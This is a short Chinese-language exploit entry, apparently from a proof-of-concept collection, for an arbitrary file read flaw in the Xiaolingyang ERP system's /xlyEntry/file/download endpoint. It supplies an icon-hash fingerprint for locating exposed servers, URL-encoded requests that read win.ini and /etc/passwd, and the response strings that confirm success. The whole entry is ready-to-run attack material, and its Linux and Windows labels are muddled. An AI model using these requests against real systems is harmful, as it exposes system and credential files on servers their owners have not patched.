# 上海小羚羊软件股份有限公司小羚羊ERP系统download存在任意文件读取漏洞

- **系统**：上海小羚羊软件股份有限公司小羚羊ERP系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`icon_hash="1470040121"`
- **请求**：`GET /xlyEntry/file/download?savePathStr=%43%3a%2f%2f%77%69%6e%64%6f%77%73%2f%2f%77%69%6e%2e%69%6e%69 HTTP/1.1`

**请求体 / payload**
```
Linux
Host:
Windows
GET /xlyEntry/file/download?savePathStr=%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1
Host:
```
- **预期**：200　|　root:
[Mail]